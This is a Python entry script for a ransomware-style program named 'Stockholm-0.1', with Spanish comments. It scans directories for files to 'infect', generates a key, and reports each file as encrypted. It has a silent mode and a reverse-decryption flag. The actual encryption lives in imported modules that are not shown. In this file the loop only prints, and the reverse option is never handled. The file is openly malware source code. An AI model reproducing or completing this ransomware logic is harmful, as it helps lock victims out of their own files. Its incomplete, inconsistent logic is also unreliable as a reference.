import argparse
from re import I
from scanner import *
from encryptor import *
from time import sleep

# Main
def run():
    # Opciones de Flags
    args = config_args()
    # Evaluacion de Flags
    ## Infeccion de directorio
    if args.reverse == False and args.version == False:
        # Escaneo de Directorio
        res_scan = scan_files(silent=args.silent)
        if len(res_scan) > 0:
            # Cifrar Archivos
            while getkey() == None:
                keygen()
            key = getkey()
            print_encryption(args.silent)
            for index_dir in res_scan:
                for lst_files,dir in index_dir.items():
                    for file in index_dir[lst_files]:
                        if args.silent == False:
                            print("[$] -> FILE ENCRIPTED {:>35}\n".format(file.replace(lst_files+"/", "")), end="")
                            sleep(0.2)
        else:
            if args.silent == False:
                print("FATAL ERROR -- INFECTION DISABLED!!")
    if args.version == True:
        print("Program version Stockholm-0.1")
    
# Configuracion de Flags
def config_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-r","--reverse",default=False,action='store_true',help="Reverse File Encryption.")
    parser.add_argument("-s","--silent",default=False,action='store_true',help="Silent mode, the program output is emitted.")
    parser.add_argument("-v","--version",default=False,action='store_true',help="Program version.")
    return parser.parse_args()

if __name__ == "__main__":
    run()